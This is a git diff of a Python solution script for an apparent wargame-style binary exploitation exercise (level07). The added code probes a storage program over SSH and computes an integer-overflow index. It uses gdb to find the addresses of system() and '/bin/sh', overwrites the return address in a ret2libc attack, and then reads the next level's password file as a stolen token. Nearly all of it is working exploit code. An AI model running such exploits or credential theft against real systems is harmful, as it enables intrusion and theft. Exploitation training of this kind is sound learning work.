@@ -2,9 +2,9 @@ import os
 import sys
 
 bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
-from utils.ssh import exec, connect_by_previous, get_func_structure, get_func_address
-from utils.text import print_output, print_title, print_magic
-from utils.base import save_token, address_to_string
+from utils.ssh import exec, connect_by_previous, get_func_address
+from utils.text import print_output, print_title, print_magic, print_action
+from utils.base import save_token, address_to_decimal
 
 client = connect_by_previous()
 
@@ -19,42 +19,43 @@ print_output(output)
 print_title("3 commands we can apply, store, read and quit, a little reverse")
 print_magic('Debug Time!')
 
-# get_func_structure(
-#     client,
-#     'auth', filter=['+20>:', '+45>:', '+114>:'],
-#     title='Ptrace to check debug, length check (5 >= characters). '
-#           'Then it creates a key with the 3rd char '
-#           'in name, and change it in a loop as big as the length of the name.'
-# )
-# login = 'lrorscha'
-# print_title(f'Find verify key for our login {login}')
-#
 print_title('We can store any data at buffer, and read already write data, try to find allocated size to get offset')
-output = exec(client, '''for((i=0;i<150;i++)); do OUTPUT=`/home/users/level07/level07 < <(python -c "print('read\\n$i\\nquit')") | grep 'Input command:  Index:'` ; NB=`echo $OUTPUT | cut -d " " -f 8`; HEX=`printf %x $NB` ; echo $OUTPUT | awk '{ print $6,"0x'"$HEX"'"}' | egrep -wv "0x0|0x1" ; done''')
+output = exec(client, f'''for((i=0;i<150;i++)); do OUTPUT=`/home/users/{binary_name}/{binary_name} < <(python -c "print('read\\n$i\\nquit')") | grep 'Input command:  Index:'` ; NB=`echo $OUTPUT | cut -d " " -f 8`; HEX=`printf %x $NB` ; echo $OUTPUT | awk '{{ print $6,"0x'"$HEX"'"}}' | egrep "114" ; done''')
 print_output(output)
-# f = lambda n: exec(
-#     client, "for((i=0;i<150;i++)); do OUTPUT=`/home/users/level07/level07 < <(python -c \"print('read\n$i\nquit')") | grep 'Input command:  Index:'` ; NB=`echo $OUTPUT | cut -d " " -f 8`; HEX=`printf %x $NB` ; echo $OUTPUT | awk \'{ print $1,$2,$3,$4,$5,$6,$7,"0x'"$HEX"'\"}\' ; done",
-# )
-# print_output(f(1))
-# print_output(output)
-# login_hex = output[0]
-# print_title('Transform hex to int')
-# serial = str(int(login_hex, 16))
-# print_output(serial)
-# print_title('Awesome! Try it!')
-#
-# output = exec(
-#     client, f'(echo "{login}"; echo "{serial}") | ./{binary_name}',
-#     title='User our login and obtained serial',
-# )
-# print_output(output)
-# print_title('Success! Time to dirty tricks')
-#
-# output = exec(
-#     client, f'echo "cat /home/users/level07/.pass" | (echo "{login}"; echo "{serial}"; cat -) | ./{binary_name} | head -n 1',
-#     title='Steal password',
-# )
-# print_output(output)
-# token = output[0]
-#
-# save_token(token)
+print_title('Is index is overflow')
+overflow_index = output[0].split('[')[1].split(']')[0]
+
+print_title('Ger reserved number')
+print_action(f"2**30 + {int(overflow_index)}")
+num = 2**30 + int(overflow_index)
+print_output(num)
+
+output = get_func_address(client, 'system')
+print_output(output)
+
+print_title('Transform address to decimal')
+system_address_decimal = address_to_decimal(output)
+print_output(str(system_address_decimal))
+
+sh_address = exec(
+    client,
+    f'''echo "y" | gdb ./{binary_name} -q -ex "b*main" -ex "r" -ex 'find __libc_start_main,+99999999,"/bin/sh"\'''',
+    title=f'Get #bin/sh address')[5]
+print_output(sh_address)
+
+print_title('Transform address to decimal')
+sh_address_decimal = address_to_decimal(sh_address)
+print_output(str(sh_address))
+
+print_title('Time to replace EIP to system address (check whoami)')
+f = lambda cmd: exec(
+    client, f'echo -e "{cmd}" | (echo -e "store\\n{system_address_decimal}\\n{num}\\nstore\\n{sh_address_decimal}\\n116\\nquit\\n"; cat -) | ./level07 | tail -n 1 | awk \'{{print $5}}\''
+)[0]
+print_output(f('whoami'))
+print_title('Nice')
+
+print_magic('Steal the password')
+token = f(f'cat /home/users/level08/.pass')
+print_output(token)
+
+save_token(token)
